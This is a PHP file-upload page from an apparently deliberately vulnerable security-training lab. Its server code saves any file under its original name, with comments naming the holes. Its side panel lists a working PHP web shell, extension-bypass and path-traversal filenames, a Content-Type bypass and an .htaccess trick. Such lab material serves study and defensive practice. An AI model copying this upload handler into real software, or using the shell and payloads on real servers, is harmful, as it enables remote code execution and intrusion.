<?php
require_once 'config.php';

$success = '';
$error = '';
$uploaded_file = '';

// Create uploads directory if it doesn't exist
$upload_dir = 'uploads/';
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    
    // VULNERABLE: No proper file validation
    // Accepts any file type, no content validation
    // Predictable file location
    
    $filename = $file['name'];
    $tmp_name = $file['tmp_name'];
    
    // Weak check - only checks extension, can be bypassed
    // shell.php.jpg, shell.phtml, etc.
    $allowed_display = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    
    // VULNERABLE: Using original filename (path traversal possible)
    // Try: ../config.php or ../../etc/passwd
    $target_path = $upload_dir . $filename;
    
    if (move_uploaded_file($tmp_name, $target_path)) {
        $success = "File uploaded successfully!";
        $uploaded_file = $target_path;
        
        // Log upload (information disclosure)
        error_log("File uploaded: $target_path from IP: " . $_SERVER['REMOTE_ADDR']);
    } else {
        $error = "Failed to upload file. Error: " . error_get_last()['message'];
    }
}

// List uploaded files
$files = [];
if (is_dir($upload_dir)) {
    $files = array_diff(scandir($upload_dir), ['.', '..']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload - Security Testing Lab</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <a href="index.php" class="logo">SecLab</a>
            <div class="nav-links">
                <a href="index.php" class="nav-link">Home</a>
                <a href="login.php" class="nav-link">Login</a>
                <a href="search.php" class="nav-link">Search</a>
                <a href="products.php" class="nav-link">Products</a>
                <a href="profile.php" class="nav-link">Profile</a>
                <a href="comments.php" class="nav-link">Comments</a>
                <a href="upload.php" class="nav-link active">Upload</a>
                <a href="admin.php" class="nav-link">Admin</a>
                <a href="api.php" class="nav-link">API</a>
                <a href="decoder.php" class="nav-link">Decoder</a>
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="grid grid-2">
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">📤</div>
                    <div>
                        <div class="card-title">File Upload</div>
                        <div class="card-subtitle">Upload your files</div>
                    </div>
                </div>

                <?php if ($success): ?>
                    <div class="alert alert-success">
                        ✅ <?php echo $success; ?>
                        <?php if ($uploaded_file): ?>
                            <br><a href="<?php echo htmlspecialchars($uploaded_file); ?>" style="color: inherit;" target="_blank">View uploaded file</a>
                        <?php endif; ?>
                    </div>
                <?php endif; ?>

                <?php if ($error): ?>
                    <div class="alert alert-error">❌ <?php echo $error; ?></div>
                <?php endif; ?>

                <form method="POST" enctype="multipart/form-data">
                    <div class="file-upload" onclick="document.getElementById('fileInput').click();">
                        <input type="file" name="file" id="fileInput" onchange="updateFileName(this)">
                        <div style="font-size: 3rem; margin-bottom: 1rem;">📁</div>
                        <p style="color: var(--text-secondary);" id="fileName">Click to select a file or drag and drop</p>
                        <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.5rem;">Any file type accepted</p>
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 1rem;">Upload File</button>
                </form>

                <?php if (count($files) > 0): ?>
                    <div style="margin-top: 2rem;">
                        <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">Uploaded Files</h4>
                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Filename</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($files as $f): ?>
                                        <tr>
                                            <td><?php echo htmlspecialchars($f); ?></td>
                                            <td>
                                                <a href="<?php echo $upload_dir . htmlspecialchars($f); ?>" target="_blank" class="btn btn-secondary" style="padding: 0.25rem 0.75rem; font-size: 0.8rem;">View</a>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                <?php endif; ?>
            </div>

            <div class="card">
                <div class="card-header">
                    <div class="card-icon">⚠️</div>
                    <div>
                        <div class="card-title">Upload Vulnerability Testing</div>
                        <div class="card-subtitle">File upload attack vectors</div>
                    </div>
                </div>

                <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">🐚 PHP Web Shell</h4>
                <p style="color: var(--text-secondary); margin-bottom: 0.5rem;">Create a file named <code>shell.php</code>:</p>
                <div class="code-block">
&lt;?php
if(isset($_GET['cmd'])) {
    echo "&lt;pre&gt;" . shell_exec($_GET['cmd']) . "&lt;/pre&gt;";
}
?&gt;
                </div>
                <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.5rem;">
                    Access: <code>/uploads/shell.php?cmd=whoami</code>
                </p>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">🔄 Extension Bypass</h4>
                <div class="code-block">
shell.php.jpg
shell.phtml
shell.php5
shell.phar
shell.php%00.jpg (null byte)
shell.php;.jpg
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">📁 Path Traversal</h4>
                <p style="color: var(--text-secondary); margin-bottom: 0.5rem;">Filename manipulation:</p>
                <div class="code-block">
../shell.php
../../shell.php
....//....//shell.php
..%2f..%2fshell.php
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">🎭 Content-Type Bypass</h4>
                <p style="color: var(--text-secondary); margin-bottom: 0.5rem;">Intercept in Burp and change:</p>
                <div class="code-block">
Content-Type: image/jpeg
(with PHP content in body)
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">💾 .htaccess Upload</h4>
                <div class="code-block">
AddType application/x-httpd-php .jpg
                </div>
                <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.5rem;">
                    Then upload shell.jpg with PHP code
                </p>

                <div class="alert alert-warning" style="margin-top: 1.5rem;">
                    ⚠️ <strong>Vulnerabilities:</strong> No file type validation, no size limit, original filename preserved, files directly accessible.
                </div>
            </div>
        </div>
    </div>

    <script>
        function updateFileName(input) {
            const fileName = input.files[0]?.name || 'Click to select a file';
            document.getElementById('fileName').textContent = fileName;
        }
    </script>
</body>
</html>

